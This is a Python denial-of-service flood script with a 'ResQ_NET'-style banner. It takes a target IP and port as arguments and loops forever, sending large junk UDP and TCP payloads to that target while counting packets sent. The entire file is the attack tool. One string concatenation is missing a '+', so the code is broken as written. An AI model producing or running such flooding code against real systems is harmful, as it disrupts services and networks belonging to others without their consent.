import socks
from sys import argv
from time import sleep
from random import randint
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
logo = '''
 ____            ___      _   _     _____ 
|  _ \ ___  ___ / _ \    | \ | | __|_   _|
| |_) / _ \/ __| | | |   |  \| |/ _ \| |  
|  _ <  __/\__ \ |_| |   | |\  |  __/| |  
|_| \_\___||___/\__\_\___|_| \_|\___||_|  
                    |_____|               
'''
print(B+logo+W)
try:
	ip = argv[1]
	port = argv[2]
except IndexError:
	print(R+'[-]'+' Argument\'s error'+"\nUsing: python3 main.py [ip] [port]"+W)
else:
	cc = 0
	tt = 0
	hostip = socks.gethostip(argv[1])
	print(B+"[*] "+P+" Starting "+R+"UDP"+B+" and "+R+"TCP"+B+" on ip: "+hostip+W)
	sleep(3)
	while True:
		udp = socks.udp(ip, port)
		xX = 'xxx' * randint(0, 10000) 
		try:
			udp.send(xX*100)
			udp.close()
		except OSError:
			print(R+"[-] Sending "+B+"UDP"+R+" packet error"+W)
		else:
			cc += 1 * 100
			print(G+"[~] "+R+"UDP"+B+" Packet sended, all packets - "+str(cc)+W)
		
		tcp = socks.tcp()
		try:
			tcp.connect(socks.gethostip(argv[1]), int(argv[2]))
		except ValueError:
			print(R+"[-] "+B+"Port number must be integer"+W)
		except OSError:
			print(R+"[-] "+B+"Error connecting "+R"TCP"+W)
		else:
			try:
				tcp.send(xX*100)
			except:
				print(R+"[-] "+B+"TCP sending packet error"+W)
			else:
				tt += 1 * 100
				tcp.close()
				print(G+"[~] "+O+"TCP"+B+" Packet sended, all packets - "+str(tt)+W)